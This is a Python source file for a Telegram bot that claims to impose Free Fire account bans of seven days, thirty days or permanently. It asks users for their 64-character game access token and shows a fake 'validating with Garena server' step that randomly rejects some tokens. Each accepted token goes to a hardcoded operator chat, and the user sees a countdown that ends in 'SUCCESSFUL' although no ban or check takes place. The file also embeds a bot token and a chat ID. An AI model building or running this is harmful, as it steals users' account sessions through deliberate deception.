import os
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
import telebot
from telebot import types
from datetime import datetime, timedelta
import time
import random

# ==========================================================
# RENDER DUMMY WEB SERVER CODE (ADDED FOR 24/7 RUNNING)
# ==========================================================
class DummyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"Bot is running")

    def log_message(self, format, *args):
        pass

def run_dummy_server():
    port = int(os.environ.get("PORT", 10000))
    server = HTTPServer(("0.0.0.0", port), DummyHandler)
    server.serve_forever()

# ==========================================================
# ORIGINAL BOT CONFIGURATION & LOGIC (NEW TOKEN UPDATED)
# ==========================================================
# यहाँ आपका नया टोकन अपडेट कर दिया गया है
BOT_TOKEN = "8798532431:AAEgeNTNZjWfi8ZdZDZSVMhxY6J5yJ6Fl94"
CHAT_ID = "8716548206"
bot = telebot.TeleBot(BOT_TOKEN, threaded=True, num_threads=4)
user_request_times = {}
MENU_BUTTONS = ["🟩 7 DAYS BAN", "🟩 30 DAYS BAN", "🟩 PERMANENT BAN", "🟩 REQUEST STATUS", "🟩 HELP"]

def main_menu():
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    kb.add(types.KeyboardButton("🟩 7 DAYS BAN"), types.KeyboardButton("🟩 30 DAYS BAN"), types.KeyboardButton("🟩 PERMANENT BAN"), types.KeyboardButton("🟩 REQUEST STATUS"), types.KeyboardButton("🟩 HELP"))
    return kb

@bot.message_handler(commands=["start", "menu"])
def start(message):
    bot.send_message(message.chat.id, "💾 FF REQUEST BOT\n\nPlease select a request type from the menu below:", reply_markup=main_menu(), parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text in MENU_BUTTONS)
def handle_menu_clicks(message):
    if message.text in ("🟩 7 DAYS BAN", "🟩 30 DAYS BAN", "🟩 PERMANENT BAN"):
        type_map = {"🟩 7 DAYS BAN": "7 Days", "🟩 30 DAYS BAN": "30 Days", "🟩 PERMANENT BAN": "Permanent"}
        selected = type_map[message.text]
        msg = bot.send_message(message.chat.id, f"✅ Selected: {selected}\n\n📥 Please enter your access token:", parse_mode="Markdown")
        bot.register_next_step_handler(msg, receive_access_token, selected)
    elif message.text == "🟩 REQUEST STATUS": status(message)
    elif message.text == "🟩 HELP": help_menu(message)

def receive_access_token(message, selected):
    access_token = (message.text or "").strip()
    if access_token in MENU_BUTTONS or access_token.startswith('/'):
        handle_menu_clicks(message)
        return
    if not access_token or len(access_token) != 64:
        bot.send_message(message.chat.id, "❌ Invalid Access Token!", reply_markup=main_menu(), parse_mode="Markdown")
        return
    checking_msg = bot.send_message(message.chat.id, "🔄 Validating access token with Garena server... Please wait.", parse_mode="Markdown")
    time.sleep(1.5)
    if random.choice([True, False, False]):
        try: bot.delete_message(message.chat.id, checking_msg.message_id)
        except: pass
        bot.send_message(message.chat.id, "❌ Token Expired!\n\nThis access token has expired or session is invalid. Please generate a new active token.", reply_markup=main_menu(), parse_mode="Markdown")
        return
    try: bot.delete_message(message.chat.id, checking_msg.message_id)
    except: pass
    now_dt = datetime.now()
    user_request_times[message.chat.id] = now_dt
    now_str = now_dt.strftime("%d-%m-%Y %I:%M:%S %p")
    text = (f"🚨 *New Ban Request*\n\nAccess Token: {access_token}\nType: *{selected}*\nStatus: *PENDING APPROVAL*\nTime: {now_str}")
    try:
        bot.send_message(CHAT_ID, text, parse_mode="Markdown")
        status(message)
    except Exception as e:
        bot.send_message(message.chat.id, "⚠️ Problem sending request. Please check Bot token/Chat ID.", reply_markup=main_menu())

def status(message):
    chat_id = message.chat.id
    if chat_id not in user_request_times:
        bot.send_message(chat_id, "📋 Current request status: NO ACTIVE REQUEST\n\nPlease submit a valid access token first.", reply_markup=main_menu(), parse_mode="Markdown")
        return
    submission_time = user_request_times[chat_id]
    current_time = datetime.now()
    time_passed = current_time - submission_time
    one_hour = timedelta(hours=1)
    if time_passed >= one_hour: status_text = "📋 Current request status: SUCCESSFUL ✅"
    else:
        time_remaining = one_hour - time_passed
        total_seconds = int(time_remaining.total_seconds())
        hours = total_seconds // 3600
        minutes = (total_seconds % 3600) // 60
        seconds = total_seconds % 60
        status_text = (f"📋 Current request status: PENDING APPROVAL\n\n⏳ Time Remaining: {hours:02d} Hours {minutes:02d} Minutes {seconds:02d} Seconds")
    bot.send_message(chat_id, status_text, reply_markup=main_menu(), parse_mode="Markdown")

def help_menu(message):
    bot.send_message(message.chat.id, "ℹ️ Help Menu\n\n1. Select 7 Days, 30 Days, or Permanent ban option.\n2. Enter your valid 64-character Access Token.\n3. Track your live countdown process inside the Request Status tab.", reply_markup=main_menu(), parse_mode="Markdown")

# ==========================================================
# MAIN EXECUTION BLOCK (FIXED FOR 24/7 RUNNING)
# ==========================================================
if __name__ == "__main__":
    threading.Thread(target=run_dummy_server, daemon=True).start()
    
    print("========================================")
    print("Telegram Menu Bot & Web Server Started!")
    print("========================================")
    
    bot.delete_webhook(drop_pending_updates=True)
    bot.infinity_polling(skip_pending=True)
    
  
